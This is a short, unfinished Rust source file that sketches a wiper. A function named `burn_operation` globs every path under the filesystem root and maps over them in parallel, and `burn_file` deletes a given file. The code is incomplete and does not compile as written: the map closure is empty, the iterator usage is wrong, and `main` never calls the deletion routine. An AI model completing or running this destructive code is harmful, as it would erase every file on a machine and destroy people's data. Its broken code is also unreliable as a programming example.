use std::fs;
extern crate glob;
use glob::glob;
use std::time::{Instant};
use rayon::prelude::*;


fn main() {
        let now = Instant::now();

       println!("Time elapsed: {} seconds", now.elapsed().as_secs());

    }


    
fn burn_operation(){

    let all_files = glob("/**").expect("Failed to read glob pattern");

    let file_failures: Vec<_> = all_files.par_iter().map(|path| {

    });
    

}


fn burn_file(path: &str) -> std::io::Result<()> {
    fs::remove_file(path)?;
    Ok(())
}